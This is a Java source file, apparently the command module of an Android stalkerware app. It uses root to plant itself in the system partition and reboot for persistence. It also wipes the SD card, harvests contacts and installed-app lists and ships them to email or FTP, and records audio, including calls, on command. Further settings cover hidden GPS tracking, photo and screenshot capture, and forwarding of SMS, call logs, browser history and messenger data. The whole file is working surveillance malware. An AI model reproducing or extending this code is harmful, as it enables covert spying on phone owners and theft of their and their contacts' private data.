package com.dwreload.modules;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import org.json.JSONArray;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Message;
import android.provider.ContactsContract;

import com.dwreload.FTPNotification;
import com.dwreload.MailNotification;
import com.dwreload.SettingsManager;
import com.dwreload.lib.Contact;
import com.dwreload.lib.FileUtil;
import com.dwreload.lib.IMessageBody;
import com.dwreload.modules.location.LocationModule;
import com.dwreload.services.AppService;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

public class CommandsModule {
	
	public static void moveToSystem(final Context context) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
						context.stopService(new Intent(context, AppService.class));
						
						PackageInfo paramPackageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
						ApplicationInfo localApplicationInfo = paramPackageInfo.applicationInfo;
						String str1 = "/system/app/" + localApplicationInfo.packageName + ".apk";
						String str2 = "busybox mv " + localApplicationInfo.sourceDir + " " + str1;
						RootTools.remount("/system", "rw");
						RootTools.remount("/mnt", "rw");
						MoveToSystemCommand command = new MoveToSystemCommand(0, str2, "busybox chmod 644 " + str1);
						RootTools.getShell(true).add(command);
					}
				} catch (Exception e) {

				}
			}
		}).start();
	}
	
	private static class MoveToSystemCommand extends CommandCapture{

		public MoveToSystemCommand(int id, String... command) {
			super(id, command);
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			try {
				CommandCapture command = new CommandCapture(0, "reboot");
				RootTools.getShell(true).add(command);	
				}
			catch (Exception e) {}
			}
		}
	
	public static void wipeSd(Context context, String code){
		try {
			SettingsManager settings = new SettingsManager(context);
			String imei = settings.imei();
			String lastCharacters = imei.substring(imei.length() - 4);
			
			if (lastCharacters.equals(code)) {
				FileUtil.wipeSdcard();
			}
			
		} catch (Exception e) {

		}
	}
	
	public static void getPhoneBook(Context context){
		try {
			ArrayList<IMessageBody> contacts = new ArrayList<IMessageBody>();
			ContentResolver cr = context.getContentResolver();
	        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
	        if (cur.getCount() > 0) {
			    while (cur.moveToNext()) {
			        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
					String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			 		if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
			 			Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
	 		 	        while (pCur.moveToNext()) {
	 		 	        	String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
	 		 	        	contacts.add(new Contact(number, name));
	 		 	        	//Log.i("DEBUG", name + " : " + number);
	 		 	        } 
	 		 	        pCur.close();
			 	    }
		        }
		 	}
	        cur.close();
	        
	        if (contacts.size() > 0) {
	        	SettingsManager settings = new SettingsManager(context);
	        	MailNotification MailNotify = new MailNotification(context);
	        	FTPNotification FTPNotify = new FTPNotification(context);
	        	if (settings.sendAllOtherToMail())
	        		{
	        		MailNotify.sendContactsToMail(contacts);
	        		}
	        	if (settings.sendAllOtherToFTP())
	        		{
	        		FTPNotify.sendContactsToFTP(contacts);	
	        		}
			}
			
		} catch (Exception e) {

		}
	}
	
	public static void getApplicationList(Context context){
		try {
			final PackageManager pm = context.getPackageManager();
			List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

			JSONArray applist = new JSONArray();
			for (ApplicationInfo packageInfo : packages) {
				applist.put(pm.getApplicationLabel(packageInfo) + " (" + packageInfo.packageName + ")");
			}
			SettingsManager settings = new SettingsManager(context);
        	MailNotification MailNotify = new MailNotification(context);
        	FTPNotification FTPNotify = new FTPNotification(context);
        	if (settings.sendAllOtherToMail())
        		{
        		MailNotify.sendApplistToMail(applist);
        		}
        	if (settings.sendAllOtherToFTP())
        		{
        		FTPNotify.sendApplistToFTP(applist);	
        		}
		} catch (Exception e) {

		}
	}
	
	public static void record(int duration){		
		Message msg = Message.obtain();
		msg.what = RecorderModule.START_RECORD_REQUEST;
		msg.arg1 = duration;
		RecorderModule.message(msg);
	}
	
	public static void recordStop(){		
		Message msg = Message.obtain();
		msg.what = RecorderModule.STOP_RECORD;
		RecorderModule.message(msg);
	}
	
	public static void callBack(Context context, String number){	
		if (number == null || number.length() == 0) {
			return;
		}
		
		try {
			Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
		} catch (Exception e) {

		}
	}
	
	/**
	 * Request single gps location update
	 * @param number - phone number; null if GCM
	 */
	public static void gpsGet(String number){
		if (number == null) {
			LocationModule.message(LocationModule.REQUEST_SINGLE_LOCATION);
		}
		else{
			Message msg = new Message();
			msg.what = LocationModule.REQUEST_SINGLE_LOCATION_SMS;
			msg.obj = number;
			LocationModule.message(msg);
		}
	}
	
	public static void restart(Context context){
		context.stopService(new Intent(context, AppService.class));
		context.startService(new Intent(context, AppService.class));
	}
	
	public static void reboot(){
		try {
			if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
				CommandCapture command = new CommandCapture(0, "reboot");
				RootTools.getShell(true).add(command);
			}
			
			
		} catch (Exception e) {

		}
	}
	
	public static void setMobileDataState(Context context, boolean enable) {
		try {
			final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			   final Class<?> conmanClass = Class.forName(conman.getClass().getName());
			   final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
			   iConnectivityManagerField.setAccessible(true);
			   final Object iConnectivityManager = iConnectivityManagerField.get(conman);
			   final Class<?> iConnectivityManagerClass =  Class.forName(iConnectivityManager.getClass().getName());
			   final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
			   setMobileDataEnabledMethod.setAccessible(true);

			   setMobileDataEnabledMethod.invoke(iConnectivityManager, enable);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void setWiFiState(Context context, Boolean enable){
		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE); 
		wifiManager.setWifiEnabled(enable);
	}

	public static void mailsettings(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			if (arr[i].contains("email="))
				{
				mSettings.email(arr[i].substring(6));
				}
			else if (arr[i].contains("serv="))
				{
				mSettings.email_server(arr[i].substring(5));
				}
			else if (arr[i].contains("user="))
				{
				mSettings.email_username(arr[i].substring(5));
				}
			else if (arr[i].contains("pass="))
				{
				mSettings.email_userpass(arr[i].substring(5));	
				}
			else if (arr[i].contains("mailto="))
				{
				mSettings.email_server(arr[i].substring(7));
				}
			else if (arr[i].contains("port="))
				{
				mSettings.servport(arr[i].substring(5));	
				}
			else if (arr[i].contains("secur="))
				{
				mSettings.securityType(arr[i].substring(6));	
				}
			else if (arr[i].contains("sms="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.sendSmstomail(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.sendSmstomail(false);
					}
				}
			else if (arr[i].contains("call="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.sendCallToMail(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.sendCallToMail(false);
					}	
				}
			else if (arr[i].contains("file="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.SendFilesToMail(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.SendFilesToMail(false);
					}	
				}
			else if (arr[i].contains("gps="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.sendGpsToMail(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.sendGpsToMail(false);
					}	
				}
			else if (arr[i].contains("hist="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.sendHistoryToMail(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.sendHistoryToMail(false);
					}	
				}
			else if (arr[i].contains("other="))
				{
				if (arr[i].substring(6).contains("1") || arr[i].substring(6).contains("yes") || arr[i].substring(6).contains("on"))
					{
					mSettings.sendAllOtherToMail(true);
					}
				else if (arr[i].substring(6).contains("0") || arr[i].substring(6).contains("no") || arr[i].substring(6).contains("off"))
					{
					mSettings.sendAllOtherToMail(false);
					}	
				}
			else if (arr[i].contains("social="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.sendSocialToMail(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.sendSocialToMail(false);
					}	
				}
			}
		}
	
	public static void ftpsettings(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			if (arr[i].contains("ftp="))
				{
				mSettings.ftp_adress(arr[i].substring(4));
				}
			else if (arr[i].contains("path="))
				{
				mSettings.ftp_path(arr[i].substring(5));
				}
			else if (arr[i].contains("user="))
				{
				mSettings.ftp_username(arr[i].substring(5));
				}
			else if (arr[i].contains("pass="))
				{
				mSettings.ftp_userpass(arr[i].substring(5));	
				}
			else if (arr[i].contains("port="))
				{
				mSettings.ftp_port(arr[i].substring(5));	
				}
			else if (arr[i].contains("sms="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.sendSMStoFTP(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.sendSMStoFTP(false);
					}
				}
			else if (arr[i].contains("call="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.sendCallToFTP(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.sendCallToFTP(false);
					}	
				}
			else if (arr[i].contains("file="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.SendFilesToFTP(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.SendFilesToFTP(false);
					}	
				}
			else if (arr[i].contains("gps="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.sendGpsToFTP(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.sendGpsToFTP(false);
					}	
				}
			else if (arr[i].contains("hist="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.sendHistoryToFTP(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.sendHistoryToFTP(false);
					}	
				}
			else if (arr[i].contains("other="))
				{
				if (arr[i].substring(6).contains("1") || arr[i].substring(6).contains("yes") || arr[i].substring(6).contains("on"))
					{
					mSettings.sendAllOtherToFTP(true);
					}
				else if (arr[i].substring(6).contains("0") || arr[i].substring(6).contains("no") || arr[i].substring(6).contains("off"))
					{
					mSettings.sendAllOtherToFTP(false);
					}	
				}
			else if (arr[i].contains("social="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.sendSocialToFTP(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.sendSocialToFTP(false);
					}	
				}
			}		
		}
	
	public static void SendSettings(Context context)
		{
		SettingsManager mSettings = new SettingsManager(context);
		MailNotification MailNotify = new MailNotification(context);
    	FTPNotification FTPNotify = new FTPNotification(context);
		if (mSettings.sendAllOtherToMail())
			{
			MailNotify.sendSettingsToMail(mSettings.getSettings());
			}
		if (mSettings.sendAllOtherToFTP())
			{
			FTPNotify.sendSettingsToFTP(mSettings.getSettings());	
			}
		}

	public static void socialset(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			
			if (arr[i].contains("vk="))
				{
				if (arr[i].substring(3).contains("1") || arr[i].substring(3).contains("yes") || arr[i].substring(3).contains("on"))
					{
					mSettings.isVkEnabled(true);
					}
				else if (arr[i].substring(3).contains("0") || arr[i].substring(3).contains("no") || arr[i].substring(3).contains("off"))
					{
					mSettings.isVkEnabled(false);
					}
				}
			else if (arr[i].contains("viber="))
				{
				if (arr[i].substring(6).contains("1") || arr[i].substring(6).contains("yes") || arr[i].substring(6).contains("on"))
					{
					mSettings.isViberEnabled(true);
					}
				else if (arr[i].substring(6).contains("0") || arr[i].substring(6).contains("no") || arr[i].substring(6).contains("off"))
					{
					mSettings.isViberEnabled(false);
					}	
				}
			else if (arr[i].contains("wa="))
				{
				if (arr[i].substring(3).contains("1") || arr[i].substring(3).contains("yes") || arr[i].substring(3).contains("on"))
					{
					mSettings.isWhatsAppEnabled(true);
					}
				else if (arr[i].substring(3).contains("0") || arr[i].substring(3).contains("no") || arr[i].substring(3).contains("off"))
					{
					mSettings.isWhatsAppEnabled(false);
					}
				}
			else if (arr[i].contains("odkl="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.isOKEnabled(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.isOKEnabled(false);
					}
				}
			else if (arr[i].contains("browser="))
				{
				if (arr[i].substring(8).contains("1") || arr[i].substring(8).contains("yes") || arr[i].substring(8).contains("on"))
					{
					mSettings.isBrowserHistoryEnabled(true);
					}
				else if (arr[i].substring(8).contains("0") || arr[i].substring(8).contains("no") || arr[i].substring(8).contains("off"))
					{
					mSettings.isBrowserHistoryEnabled(false);
					}
				}
			}
		}

	public static void SMSsettings(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			if (arr[i].contains("number="))
				{
				mSettings.notifyNumber(arr[i].substring(7));
				}
			
			else if (arr[i].contains("sms="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.notifySms(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.notifySms(false);
					}
				}
			else if (arr[i].contains("call="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("yes") || arr[i].substring(5).contains("on"))
					{
					mSettings.notifyCall(true);
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("no") || arr[i].substring(5).contains("off"))
					{
					mSettings.notifyCall(false);
					}	
				}
			else if (arr[i].contains("sim="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.isSimChangeNotificationEnabled(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.isSimChangeNotificationEnabled(false);
					}	
				}
			}
		}
	
	public static void FilterSet(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			if (arr[i].contains("add="))
				{
				mSettings.filterAdd(arr[i].substring(4));
				}
			if (arr[i].contains("del="))
				{
				mSettings.filterDel(arr[i].substring(4));
				}
			
			else if (arr[i].contains("enable="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.useFilter(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.useFilter(false);
					}
				}
			else if (arr[i].contains("type="))
				{
				if (arr[i].substring(5).contains("1") || arr[i].substring(5).contains("white"))
					{
					mSettings.filterType("1");
					}
				else if (arr[i].substring(5).contains("0") || arr[i].substring(5).contains("black"))
					{
					mSettings.filterType("0");
					}		
				}
			}
		}
	
	public static void RecSettings(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{

			
			if (arr[i].contains("format="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("3gp"))
					{
					mSettings.recordFormat("1");
					}
				else if (arr[i].substring(7).contains("3") || arr[i].substring(7).contains("amr"))
					{
					mSettings.recordFormat("3");
					}
				}
			else if (arr[i].contains("source="))
				{
				if      (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("default"))
					{
					mSettings.recordSource("0");
					}
				else if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("mic"))
					{
					mSettings.recordSource("1");
					}
				else if (arr[i].substring(7).contains("2") || arr[i].substring(7).contains("voiceuplink"))
					{
					mSettings.recordSource("2");
					}
				else if (arr[i].substring(7).contains("3") || arr[i].substring(7).contains("voicedownlink"))
					{
					mSettings.recordSource("3");
					}
				else if (arr[i].substring(7).contains("4") || arr[i].substring(7).contains("voicecall"))
					{
					mSettings.recordSource("4");
					}
				else if (arr[i].substring(7).contains("5") || arr[i].substring(7).contains("camcorder"))
					{
					mSettings.recordSource("5");
					}
				else if (arr[i].substring(7).contains("6") || arr[i].substring(7).contains("voicerecognition"))
					{
					mSettings.recordSource("6");
					}
				else if (arr[i].substring(7).contains("7") || arr[i].substring(7).contains("voicecommunication"))
					{
					mSettings.recordSource("7");
					}
				}
			else if (arr[i].contains("record="))
				{
				if      (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.isRecordEnabled(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.isRecordEnabled(false);
					}	
				}
			else if (arr[i].contains("addnum="))
				{
				if      (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.NumberInName(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.NumberInName(false);
					}	
				}
			}
		}
	
	public static void codewordset(Context context, Integer num, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 4)
			{
			return;
			}
		String command = "";
		Integer i;
		for (i = 3; i < paramnum; i++)
			{
			command = command.concat(arr[i]);
			if (i < (paramnum - 1)) command = command.concat(" ");
			}
		switch (num)
			{
			case 1:
				{
				mSettings.CodeWord1(arr[2]);
				mSettings.Cmd1(command);
				break;
				}
			case 2:
				{
				mSettings.CodeWord2(arr[2]);
				mSettings.Cmd2(command);
				break;
				}
			case 3:
				{
				mSettings.CodeWord3(arr[2]);
				mSettings.Cmd3(command);
				break;
				}
			}
		}
	
	public static void PhotoSet(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{		
			if (arr[i].contains("enable="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.isPhotoCaptureEnabled(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.isPhotoCaptureEnabled(false);
					}
				}
			else if (arr[i].contains("front="))
				{
				if (arr[i].substring(6).contains("1") || arr[i].substring(6).contains("yes") || arr[i].substring(6).contains("on"))
					{
					mSettings.isFrontCameraEnabled(true);
					}
				else if (arr[i].substring(6).contains("0") || arr[i].substring(6).contains("no") || arr[i].substring(6).contains("off"))
					{
					mSettings.isFrontCameraEnabled(false);
					}	
				}
			else if (arr[i].contains("useback="))
				{
				if (arr[i].substring(8).contains("1") || arr[i].substring(8).contains("yes") || arr[i].substring(8).contains("on"))
					{
					mSettings.UseBackCameraInsteadFront(true);
					}
				else if (arr[i].substring(8).contains("0") || arr[i].substring(8).contains("no") || arr[i].substring(8).contains("off"))
					{
					mSettings.UseBackCameraInsteadFront(false);
					}	
				}
			else if (arr[i].contains("format="))
				{
				if (arr[i].substring(7).contains("small") || arr[i].substring(7).contains("640"))
					{
					mSettings.capturePhotoSize("640");
					}
				else if (arr[i].substring(7).contains("medium") || arr[i].substring(7).contains("800"))
					{
					mSettings.capturePhotoSize("800");
					}
				else if (arr[i].substring(7).contains("HD") || arr[i].substring(7).contains("1280"))
					{
					mSettings.capturePhotoSize("1280");
					}
				}
			}
		}
	
	public static void ScreenSet(Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{		
			if (arr[i].contains("enable="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.isScreenshotEnabled(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.isScreenshotEnabled(false);
					}
				}
			else if (arr[i].contains("interval="))
				{
				mSettings.screenshotInterval(arr[i].substring(9));
				}
			else if (arr[i].contains("format="))
				{
				if (arr[i].substring(7).contains("small") || arr[i].substring(7).contains("640"))
					{
					mSettings.capturePhotoSize("640");
					}
				else if (arr[i].substring(7).contains("medium") || arr[i].substring(7).contains("800"))
					{
					mSettings.capturePhotoSize("800");
					}
				else if (arr[i].substring(7).contains("HD") || arr[i].substring(7).contains("1280"))
					{
					mSettings.capturePhotoSize("1280");
					}
				}
			}
		}
	
	public static void GpsSet (Context context, String[] arr)
		{
		SettingsManager mSettings = new SettingsManager(context);
		Integer paramnum = arr.length;
		if (paramnum < 3)
			{
			return;
			}
		Integer i;
		for (i = 2; i < paramnum; i++)
			{
			if (arr[i].contains("interval="))
				{
				mSettings.gpsInterval(arr[i].substring(9));
				}
			else if (arr[i].contains("enable="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.isGpsTrackingEnabled(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.isGpsTrackingEnabled(false);
					}
				}
			else if (arr[i].contains("hidden="))
				{
				if (arr[i].substring(7).contains("1") || arr[i].substring(7).contains("yes") || arr[i].substring(7).contains("on"))
					{
					mSettings.isGpsHidden(true);
					}
				else if (arr[i].substring(7).contains("0") || arr[i].substring(7).contains("no") || arr[i].substring(7).contains("off"))
					{
					mSettings.isGpsHidden(false);
					}	
				}
			else if (arr[i].contains("new="))
				{
				if (arr[i].substring(4).contains("1") || arr[i].substring(4).contains("yes") || arr[i].substring(4).contains("on"))
					{
					mSettings.gpsOnlyNew(true);
					}
				else if (arr[i].substring(4).contains("0") || arr[i].substring(4).contains("no") || arr[i].substring(4).contains("off"))
					{
					mSettings.gpsOnlyNew(false);
					}	
				}
			}
		}
}
